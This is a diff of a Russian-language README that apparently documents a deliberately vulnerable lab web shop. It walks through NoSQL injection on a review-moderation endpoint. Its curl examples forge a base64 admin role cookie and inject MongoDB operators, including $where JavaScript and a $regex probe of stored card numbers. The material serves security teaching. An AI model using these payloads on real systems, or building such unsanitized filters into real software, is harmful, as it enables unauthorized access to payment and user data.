@@ -103,43 +103,45 @@ curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
-Сценарий: сначала при checkout сохраняется объект карты в Mongo (`payment_cards`), после чего в админ-модерации можно сделать operator injection в поле `cardholder`.
+Сценарий: фильтр модерации принимает JSON-like значения в `author`, `rating`, `text`, `card_number`. Для демонстрации можно использовать Mongo-операторы `$where`, `$ne`, `$in`, `$regex`.
 
-1) Создать заказ с картой через `/cart/checkout` (форма корзины теперь просит cardholder/card/exp/cvv).
-2) Открыть `/product/1/reviews/moderation` под админом.
-3) В `cardholder` отправить операторный payload.
+1) Войти как админ (или подменить cookie `role=YWRtaW4=`).
+2) Открыть `/product/1/reviews/moderation`.
+3) Передавать JSON в поля фильтра (GET query или POST form).
 
+Примеры эксплуатации:
 ```bash
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d 'cardholder={"cardholder":{"$ne":null}}' \
+# $ne: получить все отзывы, где автор не alice
+curl "http://localhost:8000/product/1/reviews/moderation?author={\"$ne\":\"alice\"}&status=all" \
+  -b "role=YWRtaW4="
+
+# $in: выбрать отзывы с рейтингом 4 или 5
+curl "http://localhost:8000/product/1/reviews/moderation?rating={\"$in\":[4,5]}&status=all" \
+  -b "role=YWRtaW4="
+
+# $regex: поиск по тексту отзыва
+curl "http://localhost:8000/product/1/reviews/moderation?text={\"$regex\":\".*great.*\",\"$options\":\"i\"}&status=all" \
+  -b "role=YWRtaW4="
+
+# $where: top-level JavaScript выражение в запросе отзывов
+curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"this.rating>=4\"}&status=all" \
   -b "role=YWRtaW4="
 ```
 
-Проверка операторов Mongo (через `cardholder` поле):
+Аналогично для `payment_cards`: строковый поиск работает только по **полному номеру карты** в формате `####-####-####-####` (частичные строки типа `1` не матчатся).
 ```bash
-# $ne
+# точное совпадение по номеру карты
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$ne":""}}' \
+  --data-urlencode 'card_number=4111-1111-1111-1111' \
+  --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
 
-# $in
+# operator-based вариант (если нужен для демонстрации NoSQLi)
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$in":["Alice Hightower","Admin River North"]}}' \
-  -b "role=YWRtaW4="
-
-# $regex
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$regex":"^Alice"}}' \
-  -b "role=YWRtaW4="
-
-# $where (top-level query)
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"$where":"this.cardholder && this.cvv"}' \
+  --data-urlencode 'card_number={"$regex":"^4111"}' \
+  --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
 ```
 
